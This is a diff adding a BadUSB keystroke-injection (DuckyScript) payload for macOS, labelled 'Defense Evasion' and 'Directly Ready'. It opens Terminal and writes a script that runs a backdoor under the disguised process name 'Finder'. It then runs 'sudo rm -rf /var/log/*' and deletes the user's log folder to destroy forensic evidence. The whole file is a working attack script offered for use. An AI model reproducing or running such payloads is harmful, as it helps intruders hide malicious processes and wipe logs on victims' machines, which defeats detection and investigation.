@@ -1,0 +1,37 @@
+REM Title: macOS Process Hider
+REM Author: BadUSB Library
+REM Description: Hides malicious processes from detection
+REM Target: macOS 10.15+
+REM Category: Defense Evasion
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Hide processes
+STRING cat > /tmp/process_hider.sh << 'EOF'
+#!/bin/bash
+# Rename process to hide it
+exec -a "Finder" /tmp/backdoor.sh
+EOF
+ENTER
+DELAY 2000
+
+STRING chmod +x /tmp/process_hider.sh
+ENTER
+DELAY 1000
+
+REM Clear system logs
+STRING sudo rm -rf /var/log/*
+ENTER
+DELAY 2000
+
+REM Clear user logs
+STRING rm -rf ~/Library/Logs/*
+ENTER
+DELAY 2000
